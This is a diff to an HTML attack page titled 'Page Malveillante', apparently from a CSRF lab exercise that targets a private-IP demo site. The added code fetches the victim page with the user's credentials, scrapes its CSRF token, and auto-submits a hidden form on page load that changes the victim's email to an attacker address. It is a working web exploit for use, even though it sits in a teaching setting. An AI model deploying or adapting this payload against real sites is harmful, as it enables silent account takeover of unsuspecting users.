@@ -5,11 +5,25 @@
 </head>
 <body>
     <h1>Page Malveillante</h1>
-    <form action="update_email.php" method="POST" id="csrfForm">
+    <form action="http://172.17.250.150/ex_06_17_CSRF_demo/update_email.php" method="POST" id="csrfForm">
+        <input type="hidden" name="csrf_token" id="csrf_token">
         <input type="hidden" name="email" value="attacker@example.com">
     </form>
     <script>
-        document.getElementById('csrfForm').submit();
+        async function fetchCsrfToken() {
+            const response = await fetch('http://172.17.250.150/ex_06_17_CSRF_demo/vulnerable_site.php', {
+                credentials: 'include'
+            });
+            const text = await response.text();
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(text, 'text/html');
+            
+            const csrfToken = doc.querySelector('input[name="csrf_token"]').value;
+            document.getElementById('csrf_token').value = csrfToken;
+            document.getElementById('csrfForm').submit();
+        }
+
+        fetchCsrfToken();
     </script>
 </body>
 </html>
